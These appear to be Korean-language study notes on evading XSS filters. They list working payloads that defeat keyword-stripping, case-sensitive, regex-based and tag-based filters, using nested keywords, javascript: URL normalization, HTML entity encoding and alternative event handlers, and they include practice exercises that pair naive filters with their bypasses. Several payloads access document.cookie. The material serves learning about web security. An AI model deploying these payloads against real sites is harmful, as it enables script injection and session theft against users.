# 문자열 치환 우회 예시
```javascript
function replaceIterate(text) {
    while (true) {
        var newText = text
            .replace(/script|onerror/gi, '');
        if (newText === text) break;
        text = newText;
    }
    return text;
}
```
>replaceIterate('<imgonerror src="data:image/svg+scronerroriptxml,&lt;svg&gt;" onloadonerror="alert(1)" />')
>--> <img src="data:image/svg+xml,&lt;svg&gt;" onload="alert(1)" />
>replaceIterate('<ifronerrorame srcdoc="&lt;sonerrorcript&gt;parent.alescronerroriptrt(1)&lt;/scrionerrorpt&gt;" />')
>--> <iframe srcdoc="&lt;script&gt;parent.alert(1)&lt;/script&gt;" />
>(x => x.replace(/onerror/g, ''))('<img oneonerrorrror=promonerrorpt(1)>')
>--> <img onerror=prompt(1) />

<br/><br/>

## 실습문제
```javascript
function XSSFilter(data){
  return data.replace(/script/gi, '');
}
/*
<scscriptript>alert("hi");</scscriptript>
*/

function XSSFilter(data){
  return data.replace(/onerror/gi, '');
}
/*
<img src="123" oonerrornerror="alert('hi')" />
*/
```

# 활성 하이퍼링크
정규화를 이용한 우회
```javascript
<a href="\1\4jAVasC\triPT:alert(document.domain)">Click me!</a>
<iframe src="\1\4jAVasC\triPT:alert(document.domain)">
```

HTML Entity Encoding을 통한 우회
```javascript
<a href="\1&#4;J&#97;v&#x61;sCr\tip&tab;&colon;alert(document.domain);">Click me!</a>
<iframe src="\1&#4;J&#97;v&#x61;sCr\tip&tab;&colon;alert(document.domain);">
```

javascript의 URL 객체를 통한 정규화
```javascript
function normalizeURL(url) {
    return new URL(url, document.baseURI);
}

normalizeURL('\4\4jAva\tScRIpT:alert(1)')
--> "javascript:alert"
normalizeURL('\4\4jAva\tScRIpT:alert(1)').protocol
--> "javascript:"
normalizeURL('\4\4jAva\tScRIpT:alert(1)').pathname
--> "alert(1)"
```


# 태그와 속성 기반 필터링
Q) 대소문자 모두 검사하지 않는 방식
```javascript
x => !x.includes('script') && !x.includes('on')
```

A) 대소문자 검사 미흡 우회
```javascript
<sCRipT>alert(document.cookie)</scriPT>
<img src=x: oneRroR=alert(document.cookie) />
```

Q) 잘못된 정규표현식 우회
```javascript
x => !/<script[^>]*>[^<]/i.test(x)
```

A) 스크립트 태그 src 속성을 이용
```javascript
<script src="data:,alert(document.cookie)"></script>
```

Q) img 태그의 on 이벤트 핸들러 검사
```javascript
x => !/<img.*on/i.test(x)
```

A) 줄바꿈 문자를 이용한 검사 우회
```javascript
<img src=""\nonerror="alert(document.cookie)"/>
```

# 특정 태그 및 속성에 대한 필터링을 다른 태그 및 속성을 이용하여 필터 우회
Q) 태그 검사 예시
```javascript
x => !/<script|<img|<input/i.test(x)
```

A) 태그 검사 우회
```javascript
<video><source onerror="alert(document.domain)"/></video>
<body onload="alert(document.domain)"/>
```

Q) on 이벤트 핸들러 및 멀티라인 문자 검사
```javascript
x => !/<script|<img|<input|<.*on/is.test(x)
```

A) on 이벤트 핸들러 및 멀티 라인 문자 검사 우회<br/>
HTML Entity Encoding 사용
```javascript
<iframe src="javascript:alert(parent.document.domain)">
<iframe srcdoc="<&#x69;mg src=1 &#x6f;nerror=alert(parent.document.domain)>">
```


## 실습문제
```javascript
function XSSFilter(data){
  if(data.includes('script')){
    return false;
  }
  return true;
}
/*
<SCRIPT>alert("hi");</SCRIPT>
*/

function XSSFilter(data){
  if(data.toLowerCase().includes('script')){
    return false;
  }
  return true;
}
/*
<img src="#" onerror="alert('hi')" />
*/

function XSSFilter(data){
  if(data.toLowerCase().includes('script') ||
     data.toLowerCase().includes('on')){
    return false;
  }
  return true;
}
/*
iframe으로 쓸 경우 부모창에서 실행해야하므로 parent 사용
<iframe srcdoc="<&#x69;mg src=1 &#x6f;nerror=parent.alert(parent.document.domain)>">
*/
```